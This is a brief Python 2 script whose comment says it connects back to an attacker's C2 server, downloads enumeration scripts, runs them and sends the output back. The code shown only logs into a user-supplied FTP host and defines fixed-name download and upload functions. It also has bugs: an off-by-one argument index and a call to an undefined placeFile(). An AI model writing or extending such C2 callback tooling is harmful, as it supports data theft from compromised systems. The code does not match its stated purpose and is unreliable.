from ftplib import FTP
############################################################################
# this script connects back to our C2 box and gets several enum scripts.   #
# it will then run the scripts and send the output back to our C2 box      #
############################################################################

# Collect args from the user
print 'enter comma separated ftp details'
args=raw_input("ip, username, password").split(',')

try:
    ftp = FTP(args[1])
    ftp.login(user=args[2], passwd = args[3])

except :
    print 'faulty input. try again.'

def grabfile():

    filename = 'example.txt'

    localfile = open(filename, 'wb')
    ftp.retrbinary('RETR ' + filename, localfile.write, 1024)

    ftp.quit()
    localfile.close()


def placefile():

    filename = 'exampleFile.txt'
    ftp.storbinary('STOR '+filename, open(filename, 'rb'))
    ftp.quit()

placeFile()